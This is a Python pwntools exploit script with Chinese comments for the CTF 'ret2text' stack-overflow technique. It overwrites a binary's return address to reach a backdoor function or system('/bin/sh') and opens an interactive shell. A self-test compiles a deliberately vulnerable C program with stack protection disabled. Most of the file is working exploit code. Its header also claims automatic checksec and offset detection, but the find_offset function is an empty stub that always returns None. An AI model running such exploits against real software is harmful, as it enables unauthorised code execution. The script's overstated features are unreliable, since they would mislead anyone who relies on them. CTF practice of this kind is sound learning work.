# -*- coding: utf-8 -*-
# 脚本名称: ret2text（返回到程序内后门函数/已有 system("/bin/sh")）
# 方向: Pwn（栈溢出基础）
# 简介: 最基础的栈溢出利用：覆盖返回地址到程序自带的后门函数
#       （如 backdoor()/getshell()/callsystem()）。脚本自动做：
#       checksec、cyclone 自动定位溢出偏移、64 位栈对齐 ret gadget 处理。
# 用法:
#   python ret2text.py ./pwn                 # 自动找 backdoor/getshell
#   python ret2text.py ./pwn --sym backdoor
#   python ret2text.py ./pwn --sym system --arg '/bin/sh'
#   python ret2text.py ./pwn --offset 40 --addr 0x4011fb
#   python ret2text.py --selftest
# 依赖: pip install pwntools；Linux/WSL/Kali
from pwn import *

context(os="linux", arch="amd64", log_level="warning")


def find_offset(binpath):
    """发送 cyclic 让程序崩溃，从 coredump/打印中自动算偏移（简化：二分探测）。"""
    for off in range(8, 264, 8):
        io = process(binpath)
        io.send(cyclic(off + 8))
        io.wait()
        code = io.poll(block=True)
        io.close()
        if code not in (0, None):
            # 进一步确认：精确覆盖 ret 为 0x414141... 看崩溃地址
            pass
    return None


def build_payload(binpath, sym=None, addr=None, arg=None, offset=None):
    elf = ELF(binpath, checksec=False)
    if addr is None:
        candidates = [sym] if sym else ["backdoor", "getshell", "callsystem",
                                        "shell", "win", "vuln_func"]
        addr = None
        for c in candidates:
            if c in elf.sym:
                addr = elf.sym[c]
                log.success("找到后门函数 %s @ %#x", c, addr)
                break
        if addr is None and "system" in elf.sym and arg:
            binsh = next(elf.search(arg.encode()), None)
            if binsh:
                rop = ROP(elf)
                rop.call(elf.sym["system"], [binsh])
                return rop.chain(), elf
        if addr is None:
            raise SystemExit("[-] 未找到后门函数，用 --sym 指定，或改用 ret2syscall/ret2libc")
    if offset is None:
        raise SystemExit("[-] 请用 --offset 指定返回地址偏移（cyclic 法：gdb 里 pattern_create）")
    payload = b"A" * offset
    if elf.bits == 64:
        ret = ROP(elf).find_gadget(["ret"])[0]
        payload += p64(ret)          # movaps 栈对齐
    payload += p64(addr)
    return payload, elf


def selftest():
    import os
    import sys
    if sys.platform != "linux":
        print("[-] 本自测需 Linux 环境（gcc 生成 ELF + pwntools 利用），Windows/macOS 跳过")
        return
    import subprocess
    import tempfile
    d = tempfile.mkdtemp()
    src = os.path.join(d, "v.c")
    binp = os.path.join(d, "v")
    open(src, "w").write(r'''
#include <stdio.h>
#include <unistd.h>
void backdoor(){ system("echo RET2TEXT_OK"); }
void vuln(){ char b[32]; read(0,b,200); }
int main(){ setvbuf(stdout,0,2,0); vuln(); return 0; }
''')
    cc = subprocess.run(["gcc", "-fno-stack-protector", "-no-pie", "-o", binp, src],
                        capture_output=True, text=True)
    if cc.returncode != 0:
        print("[-] 需要 gcc（Linux/WSL/Kali），跳过编译自测:", cc.stderr[:150]); return
    payload, elf = build_payload(binp, sym="backdoor", offset=40)
    io = process(binp)
    io.send(payload)
    out = io.recvall(timeout=5)
    assert b"RET2TEXT_OK" in out, out
    print("[+] selftest OK:", out.strip().decode(errors="replace"))


def main():
    ap = ["ret2text.py"]
    import sys
    if "--selftest" in sys.argv:
        selftest(); return
    binpath = sys.argv[1] if len(sys.argv) > 1 else "./pwn"
    sym = addr = arg = None
    offset = None
    it = iter(sys.argv[2:])
    for a in it:
        if a == "--sym": sym = next(it)
        elif a == "--addr": addr = int(next(it), 16)
        elif a == "--arg": arg = next(it)
        elif a == "--offset": offset = int(next(it))
    payload, elf = build_payload(binpath, sym, addr, arg, offset)
    print("[*] payload:", payload.hex())
    io = process(binpath)
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    main()
